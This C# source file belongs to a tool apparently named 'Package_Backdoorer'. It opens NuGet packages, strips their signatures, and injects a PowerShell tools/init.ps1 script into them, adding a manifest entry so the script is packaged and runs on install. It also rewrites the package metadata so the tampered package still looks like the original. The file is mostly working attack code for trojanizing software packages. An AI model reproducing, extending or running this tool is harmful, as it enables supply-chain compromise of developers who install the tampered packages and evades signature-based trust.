using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO.Compression;
using System.IO;
using System.Diagnostics;
using System.Xml;
using System.Xml.Linq;

namespace Package_Backdoorer
{
    public class NuspecReader
    {
        string[] NuspecTags = new string[]
       {
            "<files>",
            "<file src=\"tools\\init.ps1\" target=\"tools\\init.ps1\" />",
            "</files>"
       };

        string endMetadata = "</metadata>";
        string startDeps = "<dependencies>";

        string net20 = "<group targetFramework=\".NETFramework2.0\" />";
        string net30 = "<group targetFramework=\".NETFramework3.0\" />";
        string net35 = "<group targetFramework=\".NETFramework3.5\" />";
        string net35Client = "<group targetFramework=\".NETFramework3.5-Client\" />";
        string net40 = "<group targetFramework=\".NETFramework4.0\" />";
        string net40Client = "<group targetFramework=\".NETFramework4.0-Client\" />";
        string net45 = "<group targetFramework=\".NETFramework4.5\" />";
        string net451 = "<group targetFramework=\".NETFramework4.5.1\" />";
        string net452 = "<group targetFramework=\".NETFramework4.5.2\" />";
        string net46 = "<group targetFramework=\".NETFramework4.6\" />";
        string net461 = "<group targetFramework=\".NETFramework4.6.1\" />";
        string net462 = "<group targetFramework=\".NETFramework4.6.2\" />";
        string net47 = "<group targetFramework=\".NETFramework4.7\" />";
        string net471 = "<group targetFramework=\".NETFramework4.7.1\" />";
        string net472 = "<group targetFramework=\".NETFramework4.7.2\" />";
        string net48 = "<group targetFramework=\".NETFramework4.8\" />";
        string net70 = "<group targetFramework=\"net7.0\" />";
        string net60 = "<group targetFramework=\"net6.0\" />";
        string net50 = "<group targetFramework=\"net5.0\" />";

        public ZipArchive NuPkg = null;

        public string PowerShellScript = "";

        //public string Title = null;
        //public string Version = null;
        //public string Authors = null;
        //public string Description = null;
        //public string ReleaseNotes = null;
        //public string Language = null;
        //public string Tags = null;
        //public string Readme = null;
        //public string Id = null;
        //public string LicenseUrl = null;
        //public string ProjectUrl = null;
        //public string Copyright = null;
        //public string Icon = null;
        //public string IconUrl = null;
        //public string Repository = null;
        //public string Owners = null;
        //public string License = null;
        //public string Summary = null;

        private string Path = "";

        public NuspecReader(string path)
        {
            Path = path;

            LoadPackageMetadata();
        }

        public string[] metaDataTagNames = new string[] { "id", "version", "title", "authors", "license", "licenseUrl", "icon", "readme", "projectUrl", "iconUrl", "description", "copyright", "tags", "repository", "owners", "releaseNotes", "language", "summary" };
        public Dictionary<string, string> Metadata = null;

        public void Dispose()
        {
            Metadata.Clear();
            Unload();
        }

        private void LoadPackageMetadata()
        {
            Load();
            Dictionary<string, string> metadata = new Dictionary<string, string>();
            foreach (ZipArchiveEntry entry in NuPkg.Entries)
            {
                if (entry.FullName.EndsWith(".nuspec", StringComparison.OrdinalIgnoreCase))
                {
                    Stream unzippedEntryStream = entry.Open(); // .Open will return a stream
                    StreamReader reader = new StreamReader(unzippedEntryStream);
                    string nuspec = reader.ReadToEnd();
                    XmlDocument doc = new XmlDocument();
                    doc.LoadXml(nuspec);
                    XmlNodeList nodes = doc.GetElementsByTagName("metadata")[0].ChildNodes;

                    foreach (XmlNode node in nodes)
                    {
                        foreach (string tag in metaDataTagNames)
                        {
                            if (tag == node.Name)
                            {
                                metadata.Add(tag, node.InnerText);
                            }
                        }
                    }

                    Metadata = metadata;
                    //Debugger.Break();
                    reader.Close();
                    reader.Dispose();
                    unzippedEntryStream.Close();
                }
            }

            Unload();
        }

        static string ConvertStringToUtf8Bom(string source)
        {
            var data = Encoding.UTF8.GetBytes(source);
            var result = Encoding.UTF8.GetPreamble().Concat(data).ToArray();
            var encoder = new UTF8Encoding(true);

            return encoder.GetString(result);
        }

        public void Load()
        {
            this.NuPkg = ZipFile.Open(Path, ZipArchiveMode.Update);
        }

        public void Unload()
        {
            this.NuPkg.Dispose();
        }

        static string PrettyXml(string xml)
        {
            var stringBuilder = new StringBuilder();

            var element = XElement.Parse(xml);

            var settings = new XmlWriterSettings();
            settings.OmitXmlDeclaration = false;
            settings.Indent = true;
            settings.NewLineOnAttributes = false;

            using (var xmlWriter = XmlWriter.Create(stringBuilder, settings))
            {
                element.Save(xmlWriter);
            }

            return stringBuilder.ToString();
        }

        public static string Beautify(XmlDocument doc)
        {
            string xmlString = null;
            using (MemoryStream ms = new MemoryStream())
            {
                XmlWriterSettings settings = new XmlWriterSettings
                {
                    Encoding = new UTF8Encoding(false),
                    Indent = true,
                    IndentChars = "  ",
                    NewLineChars = "\r\n",
                    NewLineHandling = NewLineHandling.Replace
                };
                using (XmlWriter writer = XmlWriter.Create(ms, settings))
                {
                    doc.Save(writer);
                }
                xmlString = Encoding.UTF8.GetString(ms.ToArray());
            }
            return xmlString;
        }

        // Function to detect the encoding for UTF-7, UTF-8/16/32 (bom, no bom, little
        // & big endian), and local default codepage, and potentially other codepages.
        // 'taster' = number of bytes to check of the file (to save processing). Higher
        // value is slower, but more reliable (especially UTF-8 with special characters
        // later on may appear to be ASCII initially). If taster = 0, then taster
        // becomes the length of the file (for maximum reliability). 'text' is simply
        // the string with the discovered encoding applied to the file.
        public Encoding detectTextEncoding(byte[] b, out String text, int taster = 1000)
        {
            //byte[] b = File.ReadAllBytes(filename);

            //////////////// First check the low hanging fruit by checking if a
            //////////////// BOM/signature exists (sourced from http://www.unicode.org/faq/utf_bom.html#bom4)
            if (b.Length >= 4 && b[0] == 0x00 && b[1] == 0x00 && b[2] == 0xFE && b[3] == 0xFF) { text = Encoding.GetEncoding("utf-32BE").GetString(b, 4, b.Length - 4); return Encoding.GetEncoding("utf-32BE"); }  // UTF-32, big-endian
            else if (b.Length >= 4 && b[0] == 0xFF && b[1] == 0xFE && b[2] == 0x00 && b[3] == 0x00) { text = Encoding.UTF32.GetString(b, 4, b.Length - 4); return Encoding.UTF32; }    // UTF-32, little-endian
            else if (b.Length >= 2 && b[0] == 0xFE && b[1] == 0xFF) { text = Encoding.BigEndianUnicode.GetString(b, 2, b.Length - 2); return Encoding.BigEndianUnicode; }     // UTF-16, big-endian
            else if (b.Length >= 2 && b[0] == 0xFF && b[1] == 0xFE) { text = Encoding.Unicode.GetString(b, 2, b.Length - 2); return Encoding.Unicode; }              // UTF-16, little-endian
            else if (b.Length >= 3 && b[0] == 0xEF && b[1] == 0xBB && b[2] == 0xBF) { text = Encoding.UTF8.GetString(b, 3, b.Length - 3); return Encoding.UTF8; } // UTF-8
            else if (b.Length >= 3 && b[0] == 0x2b && b[1] == 0x2f && b[2] == 0x76) { text = Encoding.UTF7.GetString(b, 3, b.Length - 3); return Encoding.UTF7; } // UTF-7


            //////////// If the code reaches here, no BOM/signature was found, so now
            //////////// we need to 'taste' the file to see if can manually discover
            //////////// the encoding. A high taster value is desired for UTF-8
            if (taster == 0 || taster > b.Length) taster = b.Length;    // Taster size can't be bigger than the filesize obviously.


            // Some text files are encoded in UTF8, but have no BOM/signature. Hence
            // the below manually checks for a UTF8 pattern. This code is based off
            // the top answer at: https://stackoverflow.com/questions/6555015/check-for-invalid-utf8
            // For our purposes, an unnecessarily strict (and terser/slower)
            // implementation is shown at: https://stackoverflow.com/questions/1031645/how-to-detect-utf-8-in-plain-c
            // For the below, false positives should be exceedingly rare (and would
            // be either slightly malformed UTF-8 (which would suit our purposes
            // anyway) or 8-bit extended ASCII/UTF-16/32 at a vanishingly long shot).
            int i = 0;
            bool utf8 = false;
            while (i < taster - 4)
            {
                if (b[i] <= 0x7F) { i += 1; continue; }     // If all characters are below 0x80, then it is valid UTF8, but UTF8 is not 'required' (and therefore the text is more desirable to be treated as the default codepage of the computer). Hence, there's no "utf8 = true;" code unlike the next three checks.
                if (b[i] >= 0xC2 && b[i] < 0xE0 && b[i + 1] >= 0x80 && b[i + 1] < 0xC0) { i += 2; utf8 = true; continue; }
                if (b[i] >= 0xE0 && b[i] < 0xF0 && b[i + 1] >= 0x80 && b[i + 1] < 0xC0 && b[i + 2] >= 0x80 && b[i + 2] < 0xC0) { i += 3; utf8 = true; continue; }
                if (b[i] >= 0xF0 && b[i] < 0xF5 && b[i + 1] >= 0x80 && b[i + 1] < 0xC0 && b[i + 2] >= 0x80 && b[i + 2] < 0xC0 && b[i + 3] >= 0x80 && b[i + 3] < 0xC0) { i += 4; utf8 = true; continue; }
                utf8 = false; break;
            }
            if (utf8 == true)
            {
                text = Encoding.UTF8.GetString(b);
                return Encoding.UTF8;
            }


            // The next check is a heuristic attempt to detect UTF-16 without a BOM.
            // We simply look for zeroes in odd or even byte places, and if a certain
            // threshold is reached, the code is 'probably' UF-16.
            double threshold = 0.1; // proportion of chars step 2 which must be zeroed to be diagnosed as utf-16. 0.1 = 10%
            int count = 0;
            for (int n = 0; n < taster; n += 2) if (b[n] == 0) count++;
            if (((double)count) / taster > threshold) { text = Encoding.BigEndianUnicode.GetString(b); return Encoding.BigEndianUnicode; }
            count = 0;
            for (int n = 1; n < taster; n += 2) if (b[n] == 0) count++;
            if (((double)count) / taster > threshold) { text = Encoding.Unicode.GetString(b); return Encoding.Unicode; } // (little-endian)


            // Finally, a long shot - let's see if we can find "charset=xyz" or
            // "encoding=xyz" to identify the encoding:
            for (int n = 0; n < taster - 9; n++)
            {
                if (
                    ((b[n + 0] == 'c' || b[n + 0] == 'C') && (b[n + 1] == 'h' || b[n + 1] == 'H') && (b[n + 2] == 'a' || b[n + 2] == 'A') && (b[n + 3] == 'r' || b[n + 3] == 'R') && (b[n + 4] == 's' || b[n + 4] == 'S') && (b[n + 5] == 'e' || b[n + 5] == 'E') && (b[n + 6] == 't' || b[n + 6] == 'T') && (b[n + 7] == '=')) ||
                    ((b[n + 0] == 'e' || b[n + 0] == 'E') && (b[n + 1] == 'n' || b[n + 1] == 'N') && (b[n + 2] == 'c' || b[n + 2] == 'C') && (b[n + 3] == 'o' || b[n + 3] == 'O') && (b[n + 4] == 'd' || b[n + 4] == 'D') && (b[n + 5] == 'i' || b[n + 5] == 'I') && (b[n + 6] == 'n' || b[n + 6] == 'N') && (b[n + 7] == 'g' || b[n + 7] == 'G') && (b[n + 8] == '='))
                    )
                {
                    if (b[n + 0] == 'c' || b[n + 0] == 'C') n += 8; else n += 9;
                    if (b[n] == '"' || b[n] == '\'') n++;
                    int oldn = n;
                    while (n < taster && (b[n] == '_' || b[n] == '-' || (b[n] >= '0' && b[n] <= '9') || (b[n] >= 'a' && b[n] <= 'z') || (b[n] >= 'A' && b[n] <= 'Z')))
                    { n++; }
                    byte[] nb = new byte[n - oldn];
                    Array.Copy(b, oldn, nb, 0, n - oldn);
                    try
                    {
                        string internalEnc = Encoding.ASCII.GetString(nb);
                        text = Encoding.GetEncoding(internalEnc).GetString(b);
                        return Encoding.GetEncoding(internalEnc);
                    }
                    catch { break; }    // If C# doesn't recognize the name of the encoding, break.
                }
            }

            // If all else fails, the encoding is probably (though certainly not
            // definitely) the user's local codepage! One might present to the user a
            // list of alternative encodings as shown here: https://stackoverflow.com/questions/8509339/what-is-the-most-common-encoding-of-each-language
            // A full list can be found using Encoding.GetEncodings();
            text = Encoding.Default.GetString(b);
            return Encoding.Default;
        }

        public void Build()
        {
            Load();

            foreach (ZipArchiveEntry entry in NuPkg.Entries)
            {
                if (entry.FullName == ".signature.p7s")
                {
                    entry.Delete();
                    break;
                }
            }
            //psmdcp
            foreach (ZipArchiveEntry entry in NuPkg.Entries)
            {
                if (entry.FullName.EndsWith(".nuspec", StringComparison.OrdinalIgnoreCase))
                {
                    foreach (ZipArchiveEntry entryA in NuPkg.Entries)
                    {
                        if (entryA.FullName.EndsWith(".psmdcp", StringComparison.OrdinalIgnoreCase))
                        {
                            using (Stream otherMetadataStream = entryA.Open())
                            {
                                using (StreamReader reader1 = new StreamReader(otherMetadataStream))
                                {
                                    string otherMetadata = reader1.ReadToEnd();
                                    XmlDocument doc1 = new XmlDocument();
                                    doc1.LoadXml(otherMetadata);
                                    otherMetadataStream.Position = 0;
                                    if (doc1.ChildNodes[1].ChildNodes.Count == 6)
                                    {
                                        XmlNode creator = doc1.ChildNodes[1].ChildNodes[0];
                                        creator.InnerText = Metadata["authors"];

                                        XmlNode description = doc1.ChildNodes[1].ChildNodes[1];
                                        description.InnerText = Metadata["description"];

                                        XmlNode identifier = doc1.ChildNodes[1].ChildNodes[2];
                                        identifier.InnerText = Metadata["id"];

                                        XmlNode version = doc1.ChildNodes[1].ChildNodes[3];
                                        version.InnerText = Metadata["version"];

                                        XmlNode keywords = doc1.ChildNodes[1].ChildNodes[4];
                                        keywords.InnerText = Metadata["tags"];

                                        //XmlNode lastModifiedBy = doc1.ChildNodes[1].ChildNodes[5];
                                        //lastModifiedBy.ParentNode.RemoveChild(lastModifiedBy);
                                        //lastModifiedBy.InnerText = "";
                                        //TODO Impliment

                                        string xml = Beautify(doc1);

                                        otherMetadataStream.Position = 0;
                                        byte[] d = new byte[otherMetadataStream.Length];
                                        otherMetadataStream.Write(d, 0, d.Length);
                                        otherMetadataStream.SetLength(xml.Length);
                                        otherMetadataStream.Position = 0;

                                        using (StreamWriter wr = new StreamWriter(otherMetadataStream))
                                        {
                                            wr.Write(xml);
                                            wr.Flush();
                                        }
                                    }

                                }
                            }
                        }
                    }

                    using (Stream unzippedEntryStream = entry.Open())
                    {
                        byte[] data = new byte[unzippedEntryStream.Length];
                        unzippedEntryStream.Read(data, 0, (int)unzippedEntryStream.Length);
                        unzippedEntryStream.Position = 0;
                        using (StreamReader reader = new StreamReader(unzippedEntryStream))
                        {
                            Encoding encoding = reader.CurrentEncoding;
                            string nuspec = reader.ReadToEnd();
                            XmlDocument doc = new XmlDocument();
                            doc.LoadXml(nuspec);
                            XmlNode package = doc.GetElementsByTagName("package")[0];

                            bool addInitScriptHack = false;
                            bool addInitPsScript = false;
                            foreach (XmlElement node in package.ChildNodes)
                            {
                                if (node.Name == "files")
                                {
                                    addInitScriptHack = false;
                                    addInitPsScript = false;
                                    break;
                                }
                                else
                                {
                                    addInitScriptHack = true;
                                    addInitPsScript = true;
                                }
                            }

                            if (addInitPsScript)
                            {
                                ZipArchiveEntry psScript = NuPkg.CreateEntry("tools/init.ps1");

                                using (Stream psStream = psScript.Open())
                                {
                                    using (StreamWriter psReader = new StreamWriter(psStream, new UTF8Encoding(true)))
                                    {
                                        psReader.AutoFlush = true;
                                        psReader.Write(PowerShellScript);
                                    }
                                }

                                //ZipArchiveEntry psInstallScript = NuPkg.CreateEntry("tools/net40/install.ps1");

                                //using (Stream psStream = psInstallScript.Open())
                                //{
                                //    using (StreamWriter psReader = new StreamWriter(psStream, new UTF8Encoding(true)))
                                //    {
                                //        psReader.AutoFlush = true;
                                //        psReader.Write(PowerShellScript);
                                //    }
                                //}
                            }
                            else
                            {
                                foreach (ZipArchiveEntry entryA in NuPkg.Entries)
                                {
                                    if (entryA.FullName == "tools/init.ps1")
                                    {
                                        using (Stream initStream = entryA.Open())
                                        {
                                            using (StreamWriter wr = new StreamWriter(initStream, new UTF8Encoding(true)))
                                            {
                                                wr.AutoFlush = true;
                                                wr.Write(PowerShellScript);
                                            }
                                        }
                                        break;
                                    }
                                }
                            }

                            if (addInitScriptHack)
                            {
                                XmlElement filesNode = doc.CreateElement("", "files", package.NamespaceURI);

                                XmlElement fileNode = doc.CreateElement("", "file", package.NamespaceURI);
                                fileNode.SetAttribute("src", "tools\\init.ps1");
                                fileNode.SetAttribute("target", "tools\\init.ps1");
                                filesNode.AppendChild(fileNode);

                                //XmlElement installNode = doc.CreateElement("", "file", package.NamespaceURI);
                                //installNode.SetAttribute("src", "tools\\net40\\install.ps1");
                                //installNode.SetAttribute("target", "tools\\net40\\install.ps1");
                                //filesNode.AppendChild(installNode);
                                package.AppendChild(filesNode);
                            }

                            XmlNodeList nodes = doc.GetElementsByTagName("metadata")[0].ChildNodes;

                            foreach (XmlNode node in nodes)
                            {
                                foreach (string tag in metaDataTagNames)
                                {
                                    if (tag == node.Name)
                                    {
                                        node.InnerText = Metadata[node.Name];
                                        node.InnerXml = node.InnerText;
                                    }
                                }
                            }
                            string outText = ""; ;
                            Encoding cde = detectTextEncoding(data, out outText);
                            nuspec = Beautify(doc);

                            //nuspec = nuspec.Replace("encoding=\"utf-16\"", "encoding=\"utf-8\"");
                            //nuspec = nuspec.Replace(" minClientVersion=\"2.12\"", "");

                            unzippedEntryStream.Position = 0;
                            StreamWriter writer = new StreamWriter(unzippedEntryStream, new System.Text.UTF8Encoding(true));
                            writer.Write(nuspec);
                            writer.Flush();
                            unzippedEntryStream.Flush();
                            writer.Close();

                            //Debugger.Break();

                            Unload();
                            break;
                        }
                    }
                }
            }
        }

        private void OPen(string nupkgPath)
        {
            byte[] rawData = File.ReadAllBytes(nupkgPath);

            Stream data = new MemoryStream(rawData); // The original data
            Stream unzippedEntryStream; // Unzipped data from a file in the archive


            ZipArchive archive = ZipFile.Open(nupkgPath, ZipArchiveMode.Update);

            bool addInitPsScript = false;
            foreach (ZipArchiveEntry entry in archive.Entries)
            {
                if (entry.FullName.EndsWith(".nuspec", StringComparison.OrdinalIgnoreCase))
                {
                    unzippedEntryStream = entry.Open(); // .Open will return a stream
                    StreamReader reader = new StreamReader(unzippedEntryStream);
                    string nuspec = reader.ReadToEnd();
                    XmlDocument doc = new XmlDocument();
                    doc.LoadXml(nuspec);
                    XmlNodeList nodes = doc.GetElementsByTagName("metadata")[0].ChildNodes;
                    Debugger.Break();
                    string[] lines = nuspec.Split(
                        new string[] { "\r\n", "\r", "\n" },
                        StringSplitOptions.None
                    );
                    List<string> lns = new List<string>(lines);
                    List<string> editedXml = new List<string>(lines);

                    Debugger.Break();

                    for (int i = 0; i < lns.Count; i++)
                    {
                        string line = lines[i].Trim();

                        if (line == startDeps)
                        {
                            Debugger.Break();
                            if (lines[i + 1].Trim() == net60)
                            {
                                editedXml.Insert(i + 2, net20);
                                editedXml.Insert(i + 2, net30);
                                editedXml.Insert(i + 2, net35);
                                editedXml.Insert(i + 2, net35Client);
                                editedXml.Insert(i + 2, net40);
                                editedXml.Insert(i + 2, net40);
                                editedXml.Insert(i + 2, net40Client);
                                editedXml.Insert(i + 2, net45);
                                editedXml.Insert(i + 2, net451);
                                editedXml.Insert(i + 2, net452);
                                editedXml.Insert(i + 2, net46);
                                editedXml.Insert(i + 2, net461);
                                editedXml.Insert(i + 2, net462);
                                editedXml.Insert(i + 2, net47);
                                editedXml.Insert(i + 2, net471);
                                editedXml.Insert(i + 2, net472);
                                editedXml.Insert(i + 2, net48);
                            }
                        }
                    }

                    for (int i = 0; i < editedXml.Count; i++)
                    {
                        string line = editedXml[i].Trim();

                        if (line == endMetadata)
                        {
                            if (i + 3 <= lns.Count - 1)
                            {
                                if (lines[i + 1].Trim() == NuspecTags[0] && lines[i + 2].Trim() == NuspecTags[1] && lines[i + 3].Trim() == NuspecTags[2])
                                {
                                    continue;
                                    //Debugger.Break();
                                }
                            }
                            else
                            {
                                int x = 1;
                                foreach (string s in NuspecTags)
                                {
                                    editedXml.Insert(i + x, s);
                                    x++;
                                }

                                addInitPsScript = true;
                                break;

                            }
                        }

                    }

                    StringBuilder b = new StringBuilder();
                    for (int i = 0; i < editedXml.Count; i++)
                    {
                        b.Append(editedXml[i] + "\r\n");
                    }
                    byte[] bytes = Encoding.ASCII.GetBytes(b.ToString());
                    unzippedEntryStream.Position = 0;
                    unzippedEntryStream.Write(bytes, 0, bytes.Length);
                    unzippedEntryStream.Flush();
                    unzippedEntryStream.Close();
                    Debugger.Break();
                }
            }

            if (addInitPsScript)
            {
                ZipArchiveEntry psScript = archive.CreateEntry("tools/init.ps1");

                Stream psStream = psScript.Open();

                StreamWriter psReader = new StreamWriter(psStream);
                psReader.Write(Properties.Resources.init);
                psReader.Close();
                psStream.Close();
            }

            archive.Dispose();
        }

    }
}
